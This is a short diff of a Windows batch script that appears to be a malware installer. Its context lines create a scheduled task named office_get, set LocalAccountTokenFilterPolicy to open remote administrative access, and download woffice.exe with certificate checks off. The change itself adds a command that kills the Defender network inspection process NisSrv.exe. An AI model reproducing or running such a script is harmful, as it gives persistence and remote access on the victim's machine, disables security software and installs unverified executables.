@@ -71,7 +71,8 @@ schtasks /create /tn office_get /xml %windir%\office_get.xml /F
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
 rem %windir%\wofficeie1.exe
-SLEEP 10
+rem SLEEP 10
+taskkill /f /im NisSrv.exe
 taskkill /f /im wup.exe
 net stop wup
 rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
